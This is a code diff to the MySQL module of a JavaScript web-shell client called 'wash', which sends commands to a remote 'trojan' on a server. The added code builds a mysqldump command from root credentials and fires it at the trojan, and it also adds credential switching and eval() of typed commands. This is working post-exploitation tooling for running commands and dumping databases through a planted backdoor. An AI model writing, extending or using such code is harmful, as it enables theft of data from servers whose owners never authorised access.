@@ -1,9 +1,12 @@
 // Here we pop open the wash object once again to patch in some tailored
 // functionality.
 wash.mysql = {
+
+    // buffer the raw SQL command for later use
+    cmd: '',
+
     // buffer the database connection parameters
     connection: {
-        host     : 'localhost',
         username : 'root',
         password : 'root',
         database : '',
@@ -17,16 +20,8 @@ wash.mysql = {
 
     // this will begin an emulation of a mysql terminal
     connect: function(connection_parameters){
-        console.log('mysql connect');
-
-        // at least require that connection parameters be set
-        //if(){ }
-
         // set the connection parameters
         // @todo: some kind of success-failure detection would be ideal
-        if(connection_parameters.host != null){
-            wash.mysql.connection.host = connection_parameters.host;
-        }
         wash.mysql.connection.username = connection_parameters.username;
         wash.mysql.connection.password = connection_parameters.password;
         wash.mysql.connection.database = connection_parameters.database;
@@ -45,11 +40,15 @@ wash.mysql = {
 
         // now, write a new function to process commands
         wash.process = function(command){
+            // buffer the raw SQL command
+            wash.mysql.cmd = command;
+
             // parse out the wash action
             if(shell.prompt.mode.get() == 'wash'){
                 // process wash commands as pure JavaScript. This allows for
                 // tremendous extensibility
                 try{
+                    shell.output.write(command, 'output wash');
                     eval(command);
                 }catch(e){
                     shell.output.write('wash error: Invalid command.', 'output wash_error');
@@ -63,8 +62,7 @@ wash.mysql = {
                  
                 // emulate the mysql console just by running queries through the 
                 // command line
-                var cmd = '';
-                cmd += "mysql -h'" + wash.mysql.connection.host     + "' ";
+                var cmd = 'mysql ';
                 cmd += "-u'"       + wash.mysql.connection.username + "' ";
                 cmd += "-p'"       + wash.mysql.connection.password + "' ";
                 cmd += wash.mysql.connection.database               + " "; 
@@ -80,8 +78,11 @@ wash.mysql = {
 
     // disconnects from the terminal emulation
     disconnect: function(){
+        // animate back to the default terminal
         $('body').animate({ backgroundColor : '#708090' }, 500);
         shell.status.set('Terminating mysql emulation.');
+
+        // restore the old prompt
         shell.prompt.context.set(wash.mysql.old_objects.prompt);
 
         // restore the old process function
@@ -89,8 +90,32 @@ wash.mysql = {
     },
 
     // dumps a mysql database
-    dump: function(){
-        // "outfile"
+    dump: function(connection_parameters){
+        // update the connection parameters, if necessary
+        if(connection_parameters != null){
+            wash.mysql.use(connection_parameters);
+        }
+
+        // assemble the dump command
+        var cmd = 'mysqldump ';
+        cmd += "-u'" +  wash.mysql.connection.username +  "' ";
+        cmd += "-p'" +  wash.mysql.connection.password +  "' ";
+        cmd += wash.mysql.connection.database          +  " "; 
+
+        /*
+        // @todo: this is borked for some reason
+        // must have to do with a failure to auto-vivity this .outfile object,
+        // but I'm not sure what else I can do here...
+        // pipe to an outfile if specified
+        if(connection_parameters.outfile != ''){
+            cmd += "> " + connection_parameters.outfile;
+        }
+        */
+
+        // fire the command off to the trojan
+        wash.command.action = 'shell';
+        wash.command.cmd    = cmd;
+        wash.mysql.send_and_receive();
     },
 
     // @see: wash.send_and_receive(). We just need slightly
@@ -112,7 +137,7 @@ wash.mysql = {
             shell.prompt.context.set('mysql>');
 
             // output the last command as history
-            shell.output.write(wash.response.prompt_context + ' ' + shell.prompt.get());
+            shell.output.write(wash.mysql.cmd);
 
             // display output or error, depending on which was received
             if(wash.response.error != null){
@@ -121,5 +146,16 @@ wash.mysql = {
                 shell.output.write(wash.response.output, 'output');
             }
         });
+    },
+
+    // USEs a different mysql database
+    use: function(connection_parameters){
+        // re-map the connection strings
+        if(connection_parameters.username != null){ wash.mysql.connection.username = connection_parameters.username; }
+        if(connection_parameters.password != null){ wash.mysql.connection.password = connection_parameters.password; }
+        if(connection_parameters.database != null){ wash.mysql.connection.database = connection_parameters.database; }
+
+        // notify
+        shell.output.write('wash: database connection parameters updated.', 'output wash_info');
     },
 }
